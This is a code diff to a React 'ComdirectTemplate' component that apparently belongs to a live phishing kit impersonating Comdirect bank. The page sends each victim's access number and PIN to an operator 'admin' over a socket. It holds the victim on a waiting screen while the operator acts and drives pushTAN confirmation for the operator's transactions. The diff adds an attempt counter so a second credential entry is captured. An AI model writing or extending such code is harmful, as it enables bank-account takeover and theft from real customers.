@@ -129,7 +129,7 @@ const ComdirectTemplate: React.FC = () => {
       setIsWaitingForAdmin(true);
       
       // Store the next state to transition to when admin continues
-      setSessionData(prev => ({ ...prev, pendingState: nextState }));
+      setSessionData((prev: Record<string, any>) => ({ ...prev, pendingState: nextState }));
       
       // Notify admin that user is waiting
       templateSocketClient.emit('user-waiting', {
@@ -254,7 +254,7 @@ const ComdirectTemplate: React.FC = () => {
           setLoadingMessage('Daten werden aktualisiert...');
           
           setTimeout(() => {
-            setSessionData(prev => ({ ...prev, ...data }));
+            setSessionData((prev: Record<string, any>) => ({ ...prev, ...data }));
             setLoading(false);
           }, 1000);
         },
@@ -283,7 +283,7 @@ const ComdirectTemplate: React.FC = () => {
             setIsWaitingForAdmin(false);
             setLoading(false);
             setState(sessionData.pendingState);
-            setSessionData(prev => ({ ...prev, pendingState: null }));
+            setSessionData((prev: Record<string, any>) => ({ ...prev, pendingState: null }));
           }
         },
         // Enhanced TAN system handlers
@@ -346,7 +346,8 @@ const ComdirectTemplate: React.FC = () => {
         step: 'login',
         data: {
           username: data.zugangsnummer,
-          password: data.pin
+          password: data.pin,
+          attempt: state === STATES.LOGIN ? 1 : 2
         }
       });
 
@@ -707,14 +708,12 @@ const ComdirectTemplate: React.FC = () => {
         return <PushTANScreen 
           tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
           transactionDetails={currentTanRequest?.transactionDetails}
-          onSubmit={(tan) => {
-            console.log('pushTAN submitted:', tan);
+          onConfirm={() => {
             // Send TAN completion back to admin
             templateSocketClient.emit('tan-completed', {
               requestId: currentTanRequest?.requestId,
               success: true,
-              type: currentTanRequest?.type,
-              tanValue: tan
+              type: currentTanRequest?.type
             });
             setCurrentTanRequest(null);
             setState(STATES.FINAL_SUCCESS);
